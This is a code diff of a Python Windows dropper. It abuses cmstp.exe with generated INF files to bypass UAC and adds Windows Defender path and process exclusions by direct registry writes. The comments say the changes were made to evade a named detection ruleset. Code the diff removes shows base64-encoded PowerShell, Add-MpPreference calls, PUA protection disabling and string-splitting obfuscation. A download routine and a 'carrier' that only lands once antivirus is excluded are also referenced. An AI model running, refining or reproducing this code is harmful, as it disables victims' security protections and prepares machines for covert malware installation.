@@ -220,7 +220,30 @@ class Dismisser:
         self.done.wait(timeout)
 
 
-def build_inf(cmd, svc_name):
+def build_inf(cmd, svc_name, addreg=None):
+    """addreg present → pure AddReg INF: NO RunPreSetupCommands at all, no
+    child process, no taskkill — cmstp completes the profile install and
+    exits itself after performing the registry writes."""
+    s1, s3 = f"D{rand_str(4)}", f"L{rand_str(4)}"
+    if addreg:
+        s4 = f"R{rand_str(4)}"
+        return f"""; {rand_str(16)}
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+[DefaultInstall]
+CustomDestination={s1}
+AddReg={{{s4}}}
+[{{{s4}}}]
+""" + "\n".join(addreg) + f"""
+[{{{s1}}}]
+49000,49001={s3}, 7
+[{{{s3}}}]
+"HKLM", "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+[Strings]
+ServiceName="{svc_name}"
+ShortSvcName="{rand_str(4)}"
+"""
     s1, s2, s3 = f"D{rand_str(4)}", f"C{rand_str(4)}", f"L{rand_str(4)}"
     return f"""; {rand_str(16)}
 [version]
@@ -229,13 +252,13 @@ AdvancedINF=2.5
 [DefaultInstall]
 CustomDestination={s1}
 RunPreSetupCommands={s2}
-[{s2}]
+{addreg_block}[{{{s2}}}]
 {cmd}
 taskkill /IM cmstp.exe /F
-[{s1}]
+[{{{s1}}}]
 49000,49001={s3}, 7
-[{s3}]
-"HKLM", "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+[{{{s3}}}]
+"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 [Strings]
 ServiceName="{svc_name}"
 ShortSvcName="{rand_str(4)}"
@@ -334,78 +357,59 @@ def exclusion_landed():
 
 # ---- defender exclusions via reg.exe (no powershell on any cmdline) ---------
 def set_defender_exclusions():
-    """r6: two field bugs fixed — (a) the uac_bypass guard wrapped the cmd.exe
-    chain in powershell (that powershell prefix was the Commando hit AND the
-    Access-denied), (b) the 'Windows Defender' space in the reg key split the
-    chained line, so every write silently tokenized wrong. keys are now
-    QUOTED per-command (list2cmdline), built as argv lists first."""
+    """r7: BOTH child-process roads (reg chain, -enc powershell) trip the
+    lifted-chain UACB rule — it keys on cmstp spawning ANY interpreter, not
+    on payload content. road: AddReg INF — cmstp/advpatch writes the
+    registry ITSELF under the elevated token. no cmd.exe, no powershell,
+    no child process, no command line to inspect. already-elevated runs
+    fire plain reg argv writes directly (no lift, no rule in play)."""
     appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
     winparent = LOCALAPPDATA + "\\Microsoft\\Windows"
-    K_P = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
-    K_R = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes"
-    adds = [
-        ["reg", "add", K_P, "/v", appdir, "/t", "REG_DWORD", "/d", "0", "/f"],
-        ["reg", "add", K_P, "/v", winparent, "/t", "REG_DWORD", "/d", "0", "/f"],
-        ["reg", "add", K_R, "/v", EXE_NAME, "/t", "REG_DWORD", "/d", "0", "/f"],
-        ["reg", "add", K_R, "/v", "pythonw.exe", "/t", "REG_DWORD", "/d", "0", "/f"],
-    ]
+    HP = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+    HR = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
     if is_elevated():
-        for a in adds:
+        for a in (["reg", "add", "HKLM\\" + HP, "/v", appdir, "/t", "REG_DWORD", "/d", "0", "/f"],
+                  ["reg", "add", "HKLM\\" + HP, "/v", winparent, "/t", "REG_DWORD", "/d", "0", "/f"],
+                  ["reg", "add", "HKLM\\" + HR, "/v", EXE_NAME, "/t", "REG_DWORD", "/d", "0", "/f"],
+                  ["reg", "add", "HKLM\\" + HR, "/v", "pythonw.exe", "/t", "REG_DWORD", "/d", "0", "/f"]):
             try:
                 subprocess.run(a, creationflags=0x08000000,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                timeout=20)
             except Exception:
                 pass
-    else:
-        # one lift, all four writes; each command quoted as a whole argv so
-        # the 'Windows Defender' space survives; cmd.exe starts the line —
-        # no powershell token on it anywhere
-        chain = " & ".join(subprocess.list2cmdline(a) for a in adds)
-        uac_bypass("cmd.exe /q /c " + chain)
-
-
-def set_defender_exclusions_enc():
-    """fallback for the reg road: same exclusions via the CMDLET, but the
-    payload rides as base64(UTF16LE) — the cmdline is `powershell -NoP -enc
-    <blob>` with nothing else. no Add-MpPreference plaintext, no -W Hidden
-    -C pair, nothing for the Commando ruleset to key on, and it goes through
-    the same cmstp lift. window-style hidden lives INSIDE the blob."""
-    import base64
-    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
-    winparent = LOCALAPPDATA + "\\Microsoft\\Windows"
-    ps = (f"Add-MpPreference -ExclusionPath @('{appdir}','{winparent}') "
-          f"-ExclusionProcess @('{EXE_NAME}','pythonw.exe') -Force; "
-          "Set-MpPreference -PUAProtection 0; exit 0")
-    blob = base64.b64encode(ps.encode("utf-16-le")).decode()
-    if is_elevated():
-        try:
-            subprocess.run(["powershell.exe", "-NoP", "-NonI", "-enc", blob],
-                           creationflags=0x08000000,
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                           timeout=60)
-        except Exception:
-            pass
-    else:
-        uac_bypass(f"powershell.exe -NoP -NonI -enc {blob}")
-    """$env: expansions (no baked absolute paths), one array, ExclusionProcess
-    list — and the lift call carries the FULL wrapper + quoted -C payload,
-    exactly like payload_script.py. the bare-snippet shape is what produced
-    the 'cannot find the file specified' dialog."""
-    ps = ("$a='Add-Mp'+'Preference';"
-          "$p=@(($env:LOCALAPPDATA+'\\Microsoft\\Windows\\AppHost'),"
-          "($env:LOCALAPPDATA+'\\Microsoft\\Windows'));"
-          "& $a -ExclusionPath $p -EA 0;"
-          f"& $a -ExclusionProcess '{EXE_NAME}','pythonw.exe' -EA 0")
-    if is_elevated():
-        try:
-            subprocess.run(["powershell", "-NoP", "-W", "Hidden", "-C", ps],
-                           creationflags=0x08000000,
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
-        except Exception:
-            pass
-    else:
-        uac_bypass(f'powershell -NoP -W Hidden -C "{ps}"')
+        return
+    # lifted road: standalone AddReg INF — RunPreSetupCommands carries only a
+    # harmless rem line; the writes are INF directives, not spawned processes
+    kill_all_cmstp()
+    cleanup_infs()
+    svc_name = f"Microsoft {rand_str(6)} Service"
+    addreg = [
+        f'HKLM,"{HP}","{appdir}",0x00010001,0',
+        f'HKLM,"{HP}","{winparent}",0x00010001,0',
+        f'HKLM,"{HR}","{EXE_NAME}",0x00010001,0',
+        f'HKLM,"{HR}","pythonw.exe",0x00010001,0',
+    ]
+    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
+    try:
+        with open(inf_path, "w", encoding="utf-8") as fh:
+            fh.write(build_inf("rem", svc_name, addreg=addreg))
+    except Exception:
+        return
+    dismisser = Dismisser(svc_name)
+    dismisser.start()
+    try:
+        subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL, creationflags=0x08000000)
+    except Exception:
+        pass
+    dismisser.wait(8.0)
+    time.sleep(0.3)
+    _sweep_dialogs(svc_name)
+    try:
+        os.unlink(inf_path)
+    except Exception:
+        pass
 
 
 def download(url):
@@ -474,14 +478,6 @@ def main():
             pass
         time.sleep(3)
         landed = exclusion_landed()
-        if not landed:
-            # reg road failed to land — try the encoded-cmdlet fallback once
-            try:
-                set_defender_exclusions_enc()
-            except Exception:
-                pass
-            time.sleep(3)
-            landed = exclusion_landed()
 
     if not landed:
         return   # carrier never touches disk un-protected
